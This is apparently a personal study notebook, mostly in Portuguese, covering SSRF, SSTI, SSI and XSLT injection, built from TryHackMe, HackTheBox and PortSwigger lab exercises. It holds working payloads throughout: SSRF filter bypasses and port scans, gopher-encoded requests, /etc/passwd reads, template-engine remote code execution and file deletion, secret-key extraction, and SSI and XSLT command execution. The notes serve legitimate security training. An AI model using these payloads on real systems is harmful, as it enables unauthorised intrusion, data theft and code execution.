# Server-Side Attacks (CWES)

- **SSRF** (Server-Side Request Forgery)
    
    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
    
    - **SSRF** (TryHackMe)
        - **SSRF** (**S**erver-**S**ide **R**equest **F**orgery)  **⇒** vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
        - Basicamente quando o site tem redirecionamentos ou HTTP requests e nós conseguimos interceptar e alterar a URL dele, e como nós alteramos uma URL que o site que estava renderizando, ele renderizará o que inserimos pois entenderá que veio do servidor e não da gente o Request, pois apenas alteramos.
        - Também sempre interceptar ações que mudam de link ou fazem alguma requisição na API (ex: checar estoque de produto), pode ser que tenha um HTTP request que possamos alterar ao interceptar.
        - Sempre olhar a URL por algo como:
            
            ![aa.png](./images/aa-7.png)
            
        - Caso a gnt consiga redirecionar para uma página de admin, talvez não tenhamos acesso para alterar nada nem fazer ações, pois o site entenderá que somos cliente. Então devemos inspecionar o que gostariamos de fazer e inserir no Request anterior em que temos acesso (de alterar o HTTP request).
        - `&x=` no final da URL inserida (caso seja na própria URL a vulnerabilidade), faz ignorar o resto.
        - caso a aplicação for php e tiver `?language=` na URL, podemos tentar inserir um HTTP, ex: 127.0.0.1. Conseguimos também no lugar da http inserir e ler arquivos:  `file://etc/passwd`
        - <u>**Bypass de filtros:**</u> Sempre testar`localhost` ou `127.0.0.1`, caso tenha filtro:
            - Testar `127.1`  ⇒ mesmo resultado para o sistema mas caso tenha um filtro específico pode ser que de certo.
            - Converter IP `127.0.0.1` para Decimal version (google)
            - Caso o `/admin` não funcione ⇒ encodar como URL, se não der certo encodar duas vezes.
        
        ---
        
        - **Types of SSRF:**
            - **regular SSRF** → data is returned to the attacker’s screen
            - **blind SSRF** →  SSRF occurs, but no information is returned to the attacker's screen
        - **Impacts:**
            - Access to unauthorised areas.
            - Access to customer/organisational data.
            - Ability to Scale to internal networks.
            - Reveal authentication tokens/credentials.
        - <u>**SSRF Defenses:**</u>
            - **Deny List**
                - Bloqueio de IPs ou domínios sensíveis, como o *localhost* (127.0.0.1).
                - **Riscos:**
                    - **Contorno de Deny List**: Atacantes podem usar variações de *localhost* (ex: 0.0.0.0, 127.1, 127.*.*.*, etc.).
                    - **Subdomínios maliciosos**: Atacantes podem registrar subdomínios que apontam para IPs restritos (ex: *127.0.0.1.nip.io*).
            - **Allow List:**
                - Apenas recursos explicitamente permitidos são acessíveis, bloqueando todo o resto.
                - **Ex**: Um parâmetro de URL deve começar com "*https://website.thm*" para ser aceito.
                - **Riscos:**
                    - **Contorno de Allow List**: Atacantes podem criar subdomínios maliciosos que se assemelham ao domínio permitido (ex: [*https://website.thm.attackers-domain.thm*](https://website.thm.attackers-domain.thm/)), e assim, passam pelo filtro de permissões.
        - **Open Redirect:**
            - Ocorre quando o servidor permite que os visitantes sejam redirecionados para URLs controladas por terceiros.
            - **Ex:** O endpoint [*https://website.thm/link?url=https://tryhackme.com*](https://website.thm/link?url=https://tryhackme.com)  redireciona automaticamente o visitante para o site *tryhackme.com*.
            - Riscos:
                - **Uso malicioso em SSRF**: Atacantes podem usar um redirecionamento aberto para passar pelas restrições de URL. Mesmo que o sistema só permita URLs que comecem com [*https://website.thm/*](https://website.thm/), o atacante pode redirecionar a requisição para outro domínio malicioso.
        
        ---
        
    - **SSRF** (HackTheBox)  !!
        - **Identifying**
            - **SYCP** → Inserimos um link (no caso do video, no nosso perfil podemos inserir o link de uma imagem para colocar de avatar). Para confirmarmos o SSRF, podemos procurar por interactsh no google, copiar o link/codigo dele e inserir na URL vulneravel do SSRF (e retornara algo no site interact, confirmando..)
            
            ---
            
            ![image.png](./images/image-1.png)
            
            Uma funcionalidade de checar disponibilidade de horario, ao interceptar com Burp:
            
            ![image.png](./images/image-2.png)
            
            Notamos que o site envia um Post para `availability.php` com a data e eh retornado se disponivel ou nao, ou seja, podemos comecar a tentar explorar tentando alterar essa URL.
            
            Para confirmar, podemos abrir um Listener no nosso terminal e inserir nosso IP e porta na URL:
            
            ![image.png](./images/image-3.png)
            
            Se recebermos algo no Listener, confirmamos SSRF.
            
            PARA ver se eh Basic SSRF ou Blind SSRF, tentamos conectar na aplicacao em si (ou seja, pag que sabemos q existe, como index.php), se retornar HTML (print 1) eh Basic, se retornar “erro” (print 2) eh Blind.
            
            ![image.png](./images/image-4.png)
            
            ![image.png](./images/image-5.png)
            
            ---
            
        
        ---
        
        - **Basic SSRF Exploiting**
            - **IP enumeration**
                
                Caso o parametro da URL vulneravel seja um IP, exemplo: `http://192.168.0.1:8080/admin`
                
                Podemos entao usar o Fuzzing do Burp no valor `1` para enumerar IPs
                
                ---
                
            - **Port enumeration**
                
                Uma exploracao possivel eh o scan de Portas da seguinte maneira (primeiro testamos em uma porta do localhost do alvo que sabemos que esta fechada e vemos se resulta em erro e anotamos as palavras da response para inserir no ffuf depois):
                
                Criamos um arquivo no nosso terminal com portas ate 10.000:
                
                **`seq 1 10000 > ports.txt`**
                
                PODEMOS USAR BURP INTRUDER EM VEZ O FFUF ABAIXO! (em um lab apenas o intruder funcionou)
                
                Com a requisicao e parametros, rodamos **ffuf** para checar porta por porta:
                **`ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"`**
                
            
            ---
            
            - **Directory e Subdomain Enumeration** (do servidor/URL/IP em que a requisicao estava sendo feita a priori)
                
                podemos antes de tudo testar alguns arquivos padrão e sensíveis (config, etc)
                
                Primeiro tentamos acessar pelo nosso Browser pra ver a response (apenas a url e porta, sem o php):
                
                ![image.png](./images/image-6.png)
                
                E tambem vemos o que acontece ao acessar uma pagina que SABEMOS que eh inexistente para ver o formato da resposta de erro:
                
                ![image.png](./images/image-7.png)
                
                Agora podemos usar ffuf para enumerar, retirando tambem os que retornam erro 403 com a string que vimos acima (Server at dateserver…):
                
                (PODEMOS VER DE TENTAR BURP INTRUDER!)
                
                e para subdominios podemos usar a wordlist **`dns-Jhaddix.txt`**!
                
                ```bash
                ffuf -w seclists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
                ```
                
            - **Local FIle Inclusion (LFI)**
                
                Usar a URL scheme **`file://`** para tentar ler arquivos:
                
                ```bash
                file:///etc/passwd
                ```
                
                ![image.png](./images/image-8.png)
                
                (para + detalhes de exploracao ver no modulo de LFI…)
                
                ---
                
            - **gopher Protocol**
                
                se tivermos identificado alguma porta como **SMTP** ou **MYSQL** (ver todas em `gopherus.py -h`), podemos de forma automatizada usar a ferramenta gopherus para explorar:
                
                **`python2.7 gopherus.py --exploit smtp`**
                
                Depois de preencher, temos o o payload pronto para enviar (nao sei como fazer proveito disso).
                
                ---
                
                Quando (como no caso do diretorio **`/admin`** encontrado) encontramos uma pagina que requer um prompt de login (ou seja, que exige POST) (o que nao eh possivel alterarmos manualmente pelo `http://` presente no SSRF, entao o gopher nos faz isso), podemos alternar a requisicao para POST.
                
                Antes:
                
                ![image.png](./images/image-9.png)
                
                Para mudarmos, precisamos encodar em URL os caracteres especiais, inserindo a requisicao abaixo DENTRO do parametro (dateserver):
                
                ```
                POST /admin.php HTTP/1.1
                Host: dateserver.htb
                Content-Length: 13
                Content-Type: application/x-www-form-urlencoded
                
                adminpw=admin
                ```
                
                spaces (`%20`) and newlines (`%0D%0A`) e caracteres especiais, resultado final:
                
                **`dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01`**
                
                ```bash
                POST /index.php HTTP/1.1
                Host: 172.17.0.2
                Content-Length: 265
                Content-Type: application/x-www-form-urlencoded
                
                dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
                ```
                
                FERRAMENTA: **`gopherus.py`**
                
                ---
                
        - **Bypass**
            
            [https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
            
            ---
            
            - <u>**Bypass de filtros:**</u> Sempre testar`localhost` ou `127.0.0.1`, caso tenha filtro:
                - Testar `127.1` e `0.0.0.0`  ⇒ mesmo resultado para o sistema mas caso tenha um filtro específico pode ser que de certo.
                - Converter IP `127.0.0.1` para Decimal version (google)
                - Caso o `/admin` não funcione ⇒ encodar como URL, se não der certo encodar duas vezes!!
            - <u>**Allow e Deny List E BYPASS ESPECIFICOS PRA CADA UM**</u>
                - **Deny List**
                    - Bloqueio de IPs ou domínios sensíveis, como o *localhost* (127.0.0.1).
                    - **Riscos:**
                        - **Contorno de Deny List**: Atacantes podem usar variações de *localhost* (ex: 0.0.0.0, 127.1, 127.*.*.*, etc.).
                        - **Subdomínios maliciosos**: Atacantes podem registrar subdomínios que apontam para IPs restritos (ex: *127.0.0.1.nip.io*).
                - **Allow List:**
                    - (olhar PS cheat-sheet)
                    - Apenas recursos explicitamente permitidos são acessíveis, bloqueando todo o resto.
                    - **Ex**: Um parâmetro de URL deve começar com "*https://website.thm*" para ser aceito.
                    - **Riscos:**
                        - Caso queiramos acessar **`localhost/admin`**, e a whitelist precisa ter o **`stock.weliketoshop.net`**, podemos iniciar com localhost e usar **`#@`** para anular a URL necessaria (e o diretorio **`/admin`** vai no fim normalmente, apenas fica anluada o que esta antes da **`/`** ), caso nao de, podemos encodar APENAS o **`#`**, se nao der encodamos novamente (2encodes somente no **`#`**), ex:
                        **`http://localhost:80%2523@stock.weliketoshop.net/admin`**
                            
                            OU colocar a URL allowed e depoois **`@`** e depois o localhost 
                            
                            **`stock.nahamstore.thm@localhost`**
                            
                            E com **`#`** no final:
                            
                            **`stock.nahamstore.thm@localhost#`**
                            
                        - **Contorno de Allow List**: Atacantes podem criar subdomínios maliciosos que se assemelham ao domínio permitido (ex: [*https://website.thm.attackers-domain.thm*](https://website.thm.attackers-domain.thm/)), e assim, passam pelo filtro de permissões.
                        - **OPEN REDIRECT** tambem eh um contorno??
        
        ---
        
        - **Blind SSRF**
            
            VER POSSÍVEL nomeado SEMI-BLIND SSRF (time-based)
            
            Podemos tentar fazer um port Scan, mas dependendo da aplicacao ela retorne algo como:
            
            ![image.png](./images/image-10.png)
            
            (porta claramente que nao existe responde com: Something went wront!)
            
            Porem ao checar uma porta que esta aberta (indo nas provaveis, no caso HTTP por ex..) notamos que a aplicacao retorna de maneira diferente:
            
            ![image.png](./images/image-11.png)
            
            Entao concluimos que ela responde dessa 2a maneira quando a porta esta aberta (pode ser que isso faca com que ele so conseguimos identificar as portas abertas que respondem com HTTP…ex: 3306 do mysql esta aberta mas tambem responde como fechada) 
            
            Podemos automatizar usando **ffuf**
            
            Primeiro criamos um arquivo no nosso terminal com portas ate 10.000 e depois rodamos com a mensagem do `-fr` de quando indica que a porta nao esta aberta:
            
            **`seq 1 10000 > ports.txt`**
            
            ```bash
            ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong"
            ```
            
            Apesar de nao conseguirmos ler arquivos como no Basic, podemos checar a existencia deles (caso por algum motivo isso seja util p nos) identificando a diff de resposta de um caso verdadeiro e um falso:
            
            ![image.png](./images/image-12.png)
            
            ![image.png](./images/image-13.png)
            
        
        ---
        
        - **Prestar atencao para possivel escalonamento para DDOS**
        - AS vezes ele nao faz a animacao e atualiza a pagina para fazer uma requisicao POST para API, ficar esperto sempre na requisicao do Burp prioritariamente
    
    ---
    
    - **PortSwigger**
        - **Lab 1: Basic SSRF against the local server** (APPRENTICE)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
            ```
            
            Enumeramos e encontramos o diretorio **`/admin`**
            
            `http://localhost/admin`.
            
            Ao visitar vemos que aparece a opcao de deletar usuarios, porem ao clicar em deletar nao temos a validacao e somos proibidos de faze-lo, portanto vemos no inspect como funciona o envio dessa funcao de deletar e inserimos na requisicao (no caso URL) e rodamos dnv do SSRF:
            
            `http://localhost/admin/delete?username=carlos`
            
            ---
            
        - **Lab 2: Basic SSRF against another back-end system** (APPRENTICE)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.
            ```
            
            Parametro vulneravel: `http://192.168.0.1:8080/admin`, entao fazemos IP enumeration com Fuzzing no valor `1`, depois encontramos a pagina admin e deletamos fazendo o mesmo procedimento do Lab 1.
            
            ---
            
        
        (Lab 3 apenas para versao Pro)
        
        - **Lab 4: Blind SSRF with out-of-band detection** (PRACTITIONER)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
            ```
            
            Precisamos deletar o username carlos do `http://localhost/admin`
            
            Porem nao conseguimos acessar essa URL, portanto precisamos fazer **bypass** de dois filtros, mudando o **`localhost`** para **`127.1`** e encodando o **`admin`** DUAS vezes:
            
            `http%3a%2f%2f127.1%2f%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
            
            E depois inserimos na URL o delete username (mesmo procedimento do Lab 1)
            
            ---
            
        - **Lab 5: SSRF with filter bypass via Open Redirection vulnerability** (PRACTITIONER)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the 
            local application, so you will need to find an open redirect affecting 
            the application first.
            ```
            
            Basicamente precisamos encontrar um Open Redirect (que acontece ao mudar de um produto para outro (botao: ”next product”), pois entao podemos entao inserir o LINK para o OPENREDIRECT (ja que o openredirect acontece na URL) DENTRO do SSRF encontrado, assim ele acaba passando pelos filtros ao estar primariamente acessando o proprio site (mas que com o open redirect acessamos o /admin e …)
            
            1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
            2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
            3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
            4. Create a URL that exploits the open
            redirection vulnerability, and redirects to the admin interface, and
            feed this into sthe `stockApi` parameter on the stock checker: `/product/nextProduct?path=http://192.168.0.12:8080/admin`
            5. Observe that the stock checker follows the redirection and shows you the admin page.
            6. Amend the path to delete the target user: `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
            
            ---
            
        - **Lab 7: SSRF with whitelist-based input filter** (EXPERT)
            
            ```php
            
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed an anti-SSRF defense you will need to bypass.
            ```
            
            Caso queiramos acessar **`localhost/admin`**, e a whitelist precisa ter o **`stock.weliketoshop.net`**, podemos iniciar com localhost e usar **`#@`** para anular a URL necessaria (e o diretorio **`/admin`** vai no fim normalmente, apenas fica anluada o que esta antes da **`/`** ), caso nao de, podemos encodar a **`#`**, se nao der encodamos novamente (2encodes no **`#`**), ex:
            **`http://localhost:80%2523@stock.weliketoshop.net/admin`**
            
    
    ---
    
- **SSTI** (Server-Side Template Injection)
    
    [**https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html**](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
    
    OLHAR E ANALISAR PELO INSPECT!!! pois as vezes no burp nao percebemos a resposta JSON do servidor de algum parametro enviado (ex: [https://noxpengwin.com/htb-server-side-attacks/](https://noxpengwin.com/htb-server-side-attacks/)) E tambem porque apenas alterando no INSPECIONAR (botao direito - edit e resend) conseguimos ver a resposta no response do inspecionar (ele nao renderiza na pagina pois reatualiza)
    
    ---
    
    - **SSTI - Teoria e Exemplo** (Solyd)
        - Quando conseguimos injetar Template Tags que serão renderizadas por um Template Engine, assim conseguimos executar código dentro do servidor.
        
        ---
        
        - **Template  ⇒** Basicamente um texto composto por partes estáticas e partes dinâmicas.
        - Template Tag  ⇒ marcações especiais que representam as partes dinâmicas de um template.
        - Template Engine  ⇒ biblioteca ou ferramenta que substitui as tags pelos valores, gerando o conteúdo
        - Ex: `texto = “Oi, {{user.name}}”`
            - `Oi` é a parte estática e o `{{user.name}}` é a parte dinâmica que representa um Template Tag.
            
            ![aa.png](./images/aa-8.png)
            
            - Nesse caso, a idade está sendo passada pela URL, por causa disso podemos manipular ela, trocando por algo por ex: `?idade={{user.password}}`, já o nome não, ou seja não conseguimos injetar nada.
        
        ---
        
        1. No exemplo do site, dentro da página de profile existe a opção de alterar o nome de usuário, e quando alteramos ele atualiza a página com o respectivo nome na tela, isso significa que parte da página é dinâmica.
        2. Podemos então no campo de alterar o nome inserir: `blablabla{{4*4}}`, se o resultado final for atualizado para 16, signifca que deu certo a renderização, caso não, precisaremos procurar qual a Template Engine que está sendo utilizada.
        3. Nesse caso do exemplo damos um google em: **node js template engine express.** E ver como é a sintaxe de cada uma e ir testando 
        
        ---
        
        1. Após acharmos a Template Engine podemos inserir dentro do padrão de sintaxe dela: **#{require(”child_process”).exec(”whoami”)}**
            
            Podemos fazer shell reversa
            
    
    ---
    
    - **SSTI** (HackTheBox)
        - **Identifying**
            
            Basicamente tudo que reflete na pagina e que ou por teste ou por analise/deducao percebemos que eh uma Template Dinamica sendo renderizada (exemplo: nosso Nome sendo refletido, etc)
            
            PODE OCORRER tambem em strings refletidas em PDFs (exemplo: preenchemos um formulario que em seguida gera um PDF com nosso nome refletido que preenchemos, etc)
            
            E TAMBEM sempre observar relacoes de perfil, comentarios, etc (como no caso do Lab 2 do PortSwigger)
            
            ---
            
            Primeiro testamos a seguinte String:
            
            ```
            ${{<%[%'"}}%\.
            ```
            
            Se vulneravel a SSTI, talvez de erro (NEM SEMPRE! continuar os testes)
            
            Agora, para confirmarmos a vulnerabilidade e tambem identificarmos a linguagem, primeiro seguimos o Guia da imagem:
            
            ![**`{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2**](./images/image-14.png)
            
            **`{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2**
            
            Em MAIORIA funcionara, mas nem sempre, entao podemos seguir e usar esse guia para mais linguagens e testes (exemplos do Portswigger nao funciona por serem sempre outros Templates, e temos que testar varios):
            
            [**https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html**](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
            
            **OBS:** podemos tambem pelo Wappalyzer tlvz identificar a linguagem e identificar melhor e mais rpdo, ex: Node.js Express podemos pesquisar por Templates deles e ir testando (pub eh o mais usado nesse exemplo)..
            
            ---
            
        - **Exploiting**
            
            [**https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#exploits](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#exploits)    !!**
            
            [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
            
            ---
            
            (deletei todos os espacos dos comandos abaixo, pois estava fazendo dar erro e acho que todos eram irrelevantes, usar outros payloads (hacktricks) pra testar caso nao esteja funcionando)
            
            - **Jinja2**
                
                Primeiro podemos obter configuracoes da aplicacao web:
                
                ```
                {{config.items()}}
                ```
                
                (podem retornar credenciais etc)
                
                E tambem ver info sobre o codigo fonte da aplicacao web:
                
                ```
                {{self.__init__.__globals__.__builtins__}} 
                ```
                
                ---
                
                ### **Local File Inclusion (LFI)**
                
                Podemos usar a funcao **`open`** to Python para abrir arquivos:
                
                ```
                {{self.__init__.__globals__.__builtins__.open("/etc/passwd").read()}}
                ```
                
                ---
                
                ### **Remote Code Execution (RCE)**
                
                Podemos conseguir RCE usando a biblioteca **`os`** junto com **`system`** ou **`popen`**:
                
                ```
                {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
                ```
                
                ---
                
            - **Twig**
                
                Primeiro obtemos informacoes sobre o template:
                
                ```
                {{_self}}
                ```
                
                ---
                
                ### **Local File Inclusion (LFI)**
                
                ```
                {{"/etc/passwd"|file_excerpt(1,-1)}}
                ```
                
                ---
                
                ### **Remote Code Execution (RCE)**
                
                Funcao **`system com`** **`filter`**:
                
                ```
                {{['id']|filter('system')}}
                ```
                
                Para usar `ls ../` ou outros que tem o caracter espaco dentro (e estiver retornando erro), podemos encodar em URL (duas vezes se necessario)
                
        - **Tools**
            
            [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
            
    
    ---
    
    - **PortSwigger**
        - **Lab 1: Basic server-side template injection** (PRACTITIONER) (Template: Ruby **ERB**)
            
            ```
            This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the **morale.txt** file from Carlos's home directory.
            ```
            
            - Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page.
            - In the ERB documentation, discover that the syntax `<%= someExpression %>` is used to evaluate an expression and render the result on the page.
            - Use ERB template syntax to create a test payload containing a mathematical operation, for example: `<%= 7*7 %>`
            - URL-encode this payload and insert it as the value of the `message` parameter in the URL as follows, remembering to replace `YOUR-LAB-ID` with your own lab ID: `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>`
            - Load the URL in the browser. Notice that in
            place of the message, the result of your mathematical operation is
            rendered on the page, in this case, the number 49. This indicates that
            we may have a server-side template injection vulnerability.
            - From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands.
            - Construct a payload to delete Carlos's file as follows: `<%= system("rm /home/carlos/morale.txt") %>`
        - **Lab 2: Basic server-side template injection (code context)** (PRACTITIONER) (Template: **Tornado** Python)
            
            ```php
            This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the 
            Tornado documentation to discover how to execute arbitrary code, then 
            delete the **morale.txt** file from Carlos's home directory.
            You can log in to your own account using the following credentials: **wiener:peter**
            ```
            
            Basicamente podefmos alterar o modo que queremos ser referenciados como username de perfil (name, last name, etc) e ao fazer isso, interceptando notamos que ele envia essa alteracao no Post como parametro de valor `user.name`, ou seja, ja eh um template, precisamos apensar fechar chaves e colocar o que quisermos, ex:
            
            `user.name}}{{7*7}}`
            
            Porem ao fazer isso nao aparece nada no nosso perfil, MAS ao observar produtos, notamos ao fazer um comentario, nosso nome no comentario eh dinamico, entao esse valor 49 foi renderizado la…
            
            1. While proxying traffic through Burp, log in and post a comment on one of the blog posts.
            2. Notice that on the "My account" page, you can
            select whether you want the site to use your full name, first name, or
            nickname. When you submit your choice, a `POST` request sets the value of the parameter `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. When you load the page containing your comment, the name above your
            comment is updated based on the current value of this parameter.
            3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely `POST /my-account/change-blog-post-author-display`, and send it to Burp Repeater.
            4. Study the Tornado documentation to discover
            that template expressions are surrounded with double curly braces, such
            as `{{someExpression}}`. In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows: `blog-post-author-display=user.name}}{{7*7}}`
            5. Reload the page containing your test comment. Notice that the username now says `Peter Wiener49}}`, indicating that a server-side template injection vulnerability may exist in the code context.
            6. In the Tornado documentation, identify the syntax for executing arbitrary Python: `{% somePython %}`
            7. Study the Python documentation to discover that by importing the `os` module, you can use the `system()` method to execute arbitrary system commands.
            8. Combine this knowledge to construct a payload that deletes Carlos's file: `{% import os %}
            {{os.system('rm /home/carlos/morale.txt')`
            9. In Burp Repeater, go back to `POST /my-account/change-blog-post-author-display`. Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows: `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
            10. Reload the page containing your comment to execute the template and solve the lab.
        - **Lab 3: Server-side template injection using documentation** (PRACTITIONER)
            
            ```php
            This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation 
            to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r
            ```
            
            ---
            
        - **Lab 5: Server-side template injection with information disclosure via user-supplied objects** (PRACTITIONER) (Template: Django Python)
            
            ```bash
            This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This 
            vulnerability can be exploited to access sensitive data. To solve the lab, steal and submit the framework's secret key. You can log in to your own account using the following credentials:
            **content-manager:C0nt3ntM4n4g3r**
            ```
            
            **`{% debug %}`**
            
            **`{{settings.SECRET_KEY}}`**
            
            ---
            
            1. Log in and edit one of the product description templates.
            2. Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`, and save the template. The error message in the output hints that the Django framework is being used.
            3. Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
            4. In the template, remove your invalid syntax and enter the following statement to invoke the `debug` built-in: `{% debug %}`
            5. Save the template. The output will contain a
            list of objects and properties to which you have access from within this template. Crucially, notice that you can access the `settings` object.
            6. Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
            7. In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
            8. Save the template to output the framework's secret key.
            9. Click the "Submit solution" button and submit the secret key to solve the lab.
            
            ---
            
        
    
    ---
    
- **SSI Injection** (Server-side Includes)
    
    É uma tecnologia usada para inserir conteúdo dinâmico em páginas HTML no lado do servidor, comum em servidores como **Apache** e **IIS**. A **SSI Injection** ocorre quando um atacante consegue injetar diretivas SSI maliciosas em arquivos HTML servidos pela aplicação, resultando na execução não autorizada de comandos no servidor.
    
    NORMALMENTE em extensões **`.shtml`**, **`.shtm`**, **`.stm`** (porém também pode aparecer em extensões html ou php normal..)
    
    Essa vulnerabilidade normalmente está ligada a:
    
    - Upload de arquivos que são **servidos diretamente pelo servidor**.
    - Campos de input que resultam em **criação de arquivos HTML ou TXT** no servidor.
    - **Feedbacks, mensagens, comentários** salvos e exibidos em páginas posteriores.
    
    ---
    
    ### IDENTIFICAÇÃO e EXPLORAÇÃO
    
    Podemos rodar o seguinte para testar se é vulnerável:
    
    | **Print variables** | **`<!--#printenv -->`** |
    | --- | --- |
    | Change config | `<!--#config errmsg="Error!" -->` |
    | Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
    | Execute command | `<!--#exec cmd="whoami" -->` |
    | Include web file | `<!--#include virtual="index.html" -->` |
    
    ---
    
- **XSLT Injection** (eXtensible Stylesheet Language Transformation Injection)
    
    **XSLT** (eXtensible Stylesheet Language Transformations) é uma linguagem usada para **transformar arquivos XML** em outros formatos, como HTML, texto puro, ou outro XML. Permite **selecionar dados do XML** e **formatar** de maneira customizada.
    
    1. A aplicação recebe um **arquivo XML** (com dados brutos).
    2. Um **template XSLT** define **como exibir esses dados**.
    3. O servidor aplica esse template ao XML e **gera uma resposta formatada** (HTML ou texto, por exemplo).
    
    ---
    
    ### IDENTIFICAÇÃO
    
    - O app aceita `Content-Type: application/xml`
    - Sua requisição tem XML no corpo
    - A resposta contém `<?xml` ou é estruturada com tags XML
    
    ---
    
    ## **EXPLORAÇÃO**
    
    Enviar no POST (onde eh refletido com o valor dinamico) os payloads para Information Disclosure.
    
    **se for na url, ENCODAR EM URL!!**
    
    Version:
    
    **`<xsl:value-of select="system-property('xsl:version')" />`**
    
    Vendor:
    
    **`<xsl:value-of select="system-property('xsl:vendor')" />`**
    
    Vendor URL:
    
    **`<xsl:value-of select="system-property('xsl:vendor-url')" />`**
    
    Product Name:
    
    **`<xsl:value-of select="system-property('xsl:product-name')" />`**
    
    Product Version:
    
    **`<xsl:value-of select="system-property('xsl:product-version')" />`**
    
    ---
    
    ### **Local File Inclusion (LFI)**
    
    Depende da versao e library, entao testar varios os dois:
    
    **se for na url, ENCODAR EM URL!!**
    
    ```bash
    <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
    ```
    
    ```bash
    <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
    ```
    
    ### **Remote Code Execution (RCE)**
    
    **se for na url, ENCODAR EM URL!!**
    
    ```bash
    <xsl:value-of select="php:function('system','id')" />
    ```
    

---
